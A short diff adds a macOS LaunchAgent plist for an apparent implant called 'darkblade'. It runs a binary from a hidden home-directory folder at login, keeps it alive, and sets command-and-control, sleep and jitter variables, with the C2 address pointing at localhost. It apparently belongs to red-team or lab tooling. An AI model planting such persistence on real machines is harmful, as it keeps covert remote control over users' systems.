@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>com.darkblade.agent</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>/Users/$USER/.local/db-agent/db-agent</string>
+  </array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+  <key>EnvironmentVariables</key>
+  <dict>
+    <key>DB_C2</key><string>http://127.0.0.1:8443</string>
+    <key>DB_SLEEP</key><string>60</string>
+    <key>DB_JITTER</key><string>30</string>
+  </dict>
+</dict>
+</plist>
